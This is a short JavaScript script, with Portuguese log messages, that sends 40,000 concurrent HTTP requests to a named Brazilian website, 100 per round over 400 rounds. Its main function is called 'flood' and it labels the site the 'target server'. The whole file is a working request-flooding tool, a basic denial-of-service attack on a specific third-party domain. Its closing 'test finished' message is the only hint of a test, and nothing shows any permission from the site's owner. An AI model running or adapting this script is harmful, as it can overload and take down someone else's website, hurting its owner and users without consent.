

const MAX_REQUESTS = 100;
const TOTAL_ROUNDS = 400; 
const DELAY_BETWEEN_ROUNDS = 1000; 

async function requestSite() {
    try {
        const response = await fetch('https://sitedemonte.com.br/?gp=restaurantes');
        if (!response.ok) throw new Error(`Erro: ${response.status}`);
        console.log('REQ enviada com sucesso');
    } catch (error) {
        console.error('Erro no servidor alvo:', error);
    }
}

async function flood() {
    for (let round = 0; round < TOTAL_ROUNDS; round++) {
        console.log(` Rodada ${round + 1} - Enviando ${MAX_REQUESTS} REQ`);
        
        const requests = Array.from({ length: MAX_REQUESTS }, requestSite);
        await Promise.all(requests);

        console.log(`Rodada ${round + 1} concluída`);
        await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_ROUNDS)); 
    }

    console.log('Teste finalizado');
}

flood();
